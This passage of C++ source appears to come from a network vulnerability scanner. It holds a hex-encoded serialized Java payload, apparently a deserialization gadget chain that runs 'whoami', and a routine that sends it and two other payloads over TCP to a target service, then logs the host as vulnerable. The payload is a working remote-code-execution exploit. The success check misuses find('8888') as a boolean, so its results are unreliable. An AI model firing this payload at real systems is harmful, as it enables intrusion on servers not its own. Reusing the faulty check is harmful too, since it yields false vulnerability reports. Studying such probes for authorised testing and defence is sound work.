1\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\xa0\xf0\xa4\x38\x7a\x3b\xb3\x42\x02\x00\x00\x70\x78\x70\x73\x71\x00\x7e\x00\x16\x75\x71\x00\x7e\x00\x1b\x00\x00\x00\x02\x74\x00\x07\x64\x6f\x5f\x65\x78\x65\x63\x75\x71\x00\x7e\x00\x1d\x00\x00\x00\x01\x71\x00\x7e\x00\x36\x74\x00\x09\x67\x65\x74\x4d\x65\x74\x68\x6f\x64\x75\x71\x00\x7e\x00\x1d\x00\x00\x00\x02\x71\x00\x7e\x00\x36\x71\x00\x7e\x00\x23\x73\x71\x00\x7e\x00\x16\x75\x71\x00\x7e\x00\x1b\x00\x00\x00\x02\x70\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x70\x78\x70\x00\x00\x00\x01\x74\x00\x06\x77\x68\x6f\x61\x6d\x69\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x75\x71\x00\x7e\x00\x1d\x00\x00\x00\x02\x76\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x78\x70\x71\x00\x7e\x00\x2f\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x70\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x01\x74\x00\x05\x76\x61\x6c\x75\x65\x71\x00\x7e\x00\x48\x78\x78\x76\x72\x00\x1b\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x61\x6e\x6e\x6f\x74\x61\x74\x69\x6f\x6e\x2e\x54\x61\x72\x67\x65\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x78\x70)";
	char szBuffer[100] = { 0 };
	
	int packetSize;
	string receiveData1;
	
	if (!tcpClient.initWinSock())
	{
		if (!tcpClient.createSocket(clientSocket))
		{
			if (!tcpClient.connectSocket(clientSocket, this->portService.serviceIpAddr, this->portService.dwServicePort))
			{
				if (!tcpClient.sendData(clientSocket, getHexString(payload1)))
				{
					Sleep(50);
					if (!tcpClient.sendData(clientSocket, getHexString(payload2)))
					{
						Sleep(50);
						if (!tcpClient.sendData(clientSocket, getHexString(payload3)))
						{
							if (!tcpClient.receiveData(clientSocket, receiveData1, &packetSize))
							{
								if (receiveData1.find("8888")){
									memset(szBuffer, 0, 100);
									sprintf(szBuffer, "%s %s %s", this->portService.serviceIpAddr.data(), this->portService.serviceNameString.data(), bugName.data());
									g_vServiceMutex.lock();
									g_vServiceVuln.push_back(ServiceVuln(this->portService.serviceNameString, true, true, this->portService.dwServicePort, szBuffer));
									g_vServiceMutex.unlock();
									closesocket(clientSocket);
									return;
								}
							}
						}
					}
				}
			}
			else{
				return;
			}
		}
	}
	closesocket(clientSocket);
}